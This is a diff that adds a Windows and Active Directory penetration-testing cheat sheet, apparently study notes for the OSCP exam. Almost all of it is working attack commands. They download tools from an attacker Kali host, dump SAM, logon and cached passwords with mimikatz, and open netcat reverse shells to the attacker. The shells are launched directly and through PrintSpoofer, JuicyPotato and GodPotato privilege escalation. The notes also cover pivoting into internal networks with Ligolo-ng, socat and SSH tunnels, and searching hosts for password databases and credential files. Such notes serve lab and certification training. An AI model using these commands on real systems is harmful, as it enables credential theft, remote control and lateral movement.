@@ -1,0 +1,86 @@
+
+=================================== Active Directory =======================================
+
+iwr -uri http://Kali-IP/mimikatz.exe -Outfile mimikatz.exe
+.\mimikatz.exe
+lsadump::sam    // Dump sam hashes
+sekurlsa::logonpasswords    // Dump logon passwords
+lsadump::cache      //dump cache stored passwords
+
+iwr -uri http://Kali-IP/powerview.ps1 -Outfile powerview.ps1    // Upload PowerView on a Windows target
+iwr -uri http://Kali-IP/PowerUp.ps1 -Outfile PowerUp.ps1         // Upload PowerUp on a Windows target
+
+//those three commands will run PowerUp tool and start for PE check.
+powershell -ep bypass    
+. .\PowerUp.ps1
+Invoke-AllChecks
+
+iwr -uri http://Kali-IP/ADenum.ps1 -Outfile ADenum.ps1    //Upload AD Enum on windows target
+iwr -uri http://Kali-IP/SharpHound.ps1 -Outfile SharpHound.ps1   //Upload AD Enum on SharpHound target
+
+iwr -uri http://Kali-IP/adPEAS.ps1 -Outfile adPEAS.ps1 //Upload adPEAS on windows target (adPEAS is an AD scanner)
+//run adPEAS
+Import-Module .\adPEAS.ps1
+Invoke-adPEAS -Domain oscp.exam -Force
+
+
+================================== NetCat ========================================
+iwr -uri http://Kali-IP/nc64.exe -Outfile nc64.exe
+nc64.exe Kali-IP 6666 -e cmd.exe
+=============================== Privilege Escalation ===========================================
+
+iwr -uri http://Kali-IP/winPEASx64.exe -Outfile winPEASx64.exe //Upload winPEASx64 on windows target
+
+iwr -uri http://Kali-IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe   //Upload PrintSpoofer64 on windows target
+.\PrintSpoofer.exe -i -c cmd // this command will escalate the privilege to system within the same shell
+.\PrintSpoofer64.exe -i -c "nc64.exe Kali-IP 6666 -e cmd.exe" // this command will use nc64.exe to establish a reverse shell to kali
+
+
+echo c:\Users\kohsuke\Desktop\nc64.exe 10.10.14.8 6666 -e cmd.exe > reverse.bat   //this command will prepare nc64.exe to be ready to used by juicypotato
+juicypotato.exe -l 6666 -p c:\Users\kohsuke\Desktop\reverse.bat -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}  // executing juicypotato
+
+// the below three binaries are GodPotato tool, which is used to escalate privileges when seimpersonateprivilege is enable when executing whoami /priv on windows host
+iwr -uri http://Kali-IP/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe    
+iwr -uri http://Kali-IP/GodPotato-NET35.exe -Outfile GodPotato-NET35.exe
+iwr -uri http://Kali-IP/GodPotato-NET2.exe -Outfile GodPotato-NET2.exe
+
+// this is how to run each one, if one didn't work, try the another one!
+.\GodPotato-NET4.exe -cmd "C:\users\backup_service\desktop\nc64.exe Kali-IP 5555 -e cmd.exe"
+.\GodPotato-NET35.exe -cmd "C:\users\Public\nc64.exe Kali-IP 6666 -e cmd.exe"
+.\GodPotato-NET2.exe -cmd "C:\users\Public\nc64.exe Kali-IP 5555 -e cmd.exe"
+
+================================== Pivoting with Ligolo-ng ========================================
+cd /home/kali/Desktop/adtools // step one change directory where is proxy located
+ip tuntap add user kali mode tun ligolo    // add ligolo interface to kali
+ip link set ligolo up    // set it UP
+./proxy // start the proxy
+
+// now from the target machine where you have multiple interfaces and one of them is related to internal network
+iwr -uri http://Kali-IP/agent.exe -Outfile agent.exe // upload agent.exe using powershell
+agent.exe -connect Kali-IP:11601 -ignore-cert // start it
+ip route add 10.20.78.0/24 dev ligolo  // on kali add route
+// now you have access to the internal network.
+
+
+listener_add --addr 0.0.0.0:1234 --to Kali-IP:80 --tcp  // lets say you have access to the internal network, you comprimised one of the internal network hosts, 
+                                      // you now need to upload something from you kali, but there is no direct connection from the internal host to kali, but you still have the host that you used to run agent.exe, this command will make this host a bridge between the internal host and you kali machine, when you try to upload something to the internal host, 
+                                      // put the ip of the host in the middle and port 1234, and it will send the request to port 80 on kali.
+
+
+socat -ddd TCP-LISTEN:8888,fork TCP:127.0.0.1:8000  // use socat when you need to access a localhost of a machine from your kali. 
+
+ssh -N -R 127.0.0.1:7788:127.0.0.1:60002 kali@Kali-IP      // this one will do the same as above.
+
+=============================== File Mining to find Creds on windows hosts ===========================================
+
+
+Get-ChildItem -Path C:\users -Include *.sam,*.txt,*.ps1,*.log,*.exe,*.kdbx,*.gitconfig,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path / -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  // this one will look for kdbx files which contain a password manager database
+
+Get-ChildItem -Path C:\ -Include backup.* -File -Recurse -ErrorAction SilentlyContinue
+
+
+Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+
